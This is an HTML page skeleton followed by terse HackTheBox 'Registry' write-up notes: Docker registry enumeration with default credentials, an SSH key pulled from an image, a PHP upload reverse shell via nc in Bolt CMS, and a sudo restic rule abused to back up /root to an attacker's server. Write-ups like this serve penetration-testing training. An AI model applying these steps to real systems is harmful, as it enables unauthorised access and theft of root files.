<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <title>V01t4ic's HTB Write-ups</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" 
            integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
        <link href="css/style.css" rel="stylesheet">
        <meta name="description" content="Pen-testing Write-ups and Cheatsheets">
    </head>
    <body>
        <div class="container">
            <header>
                <nav>
                    <div class="container pt-5 px-5 d-flex flex-column flex-md-row justify-content-between bg-white" id="navHeader">
                        <a class="d-none d-md-inline-block" href='about.html'>About</a>
                        <a class="d-none d-md-inline-block" href='cheatsheet.html'>Cheatsheet</a>
                        <a class="d-none d-md-inline-block" data-toggle="collapse" data-target="#writeupsMenu" 
                            aria-controls="writeupsMenu" aria-expanded="false" aria-label="Toggle writeups menu" href="#">Write-ups</a>
                    </div>
                    <div class="collapse bg-white" id="writeupsMenu">
                        <div class="container pt-1 px-5 flex-md-row bg-white">
                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB :: Zetta</a>
                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB :: Registry</a>
                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB :: Craft</a>
                        </div>
                    </div>
                </nav>
            </header>
            <main>
            </main>
        </div>
        <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" 
            integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" 
            integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" 
            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
    </body>
</html>
## USER 

added docker.registry.htb to hosts 
and starget gobuster against https on port 443

fond a path to /v2

and read the HTTP response header which said: 
Docker-Distribution-Api-Version   registry/2.0

it meant that this box is running docker and turned out /v2 stands for API 

to get image name GET this path /v2/_catalog

to make docker pull working 1st we need to setup cert which is done with this command:
openssl s_client -showcerts -connect docker.registry.htb:443 < /dev/null | sed \
    -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > /etc/docker/certs.d/docker.registry.htb/ca.crt

      
after that login with admin:admin
docker login -u admin -p admin docker.registry.htb:443/bolt-image

now image can be pulled:
docker pull docker.registry.htb:443/bolt-image

run it and see what's inside.
docker run -it 601499e98a60

greb the id_rsa for bolt user
check /var/www/html/sync.sh and see that it runs without a passphrase 
check .viminfo and find the last edited file. 
that's the file with the pass phrase..

#ROOT

fond webapp in /var/www/html got admin hash from it's database and used it here:
http://registry.htb/bolt/bolt/login 

go to main configuration and allow php uploads
using shell_exec() setup a listening nc connecion and connect to 
the remote listener from attacker's box to get a rev shell as www-data

this user can sudo a command without a password:
sudo /usr/bin/restic backup -r rest*

which means we can setup a listening restic server and backup any directory or file to our server
fetch go server from restic-server github repo and build a binary (optionally compress it with upx -9)

create a temporary dir for out new repo like this
restic init --repo ./tmp

and serv the repo: restic-server --path ./tmp --no-auth
backup the /root dir: sudo /usr/bin/restic backup -r rest:http://localhost:8000/ /root
restore the repo: mkdir restore && restic -r ./tmp restore latest --target ./restore

rooted..
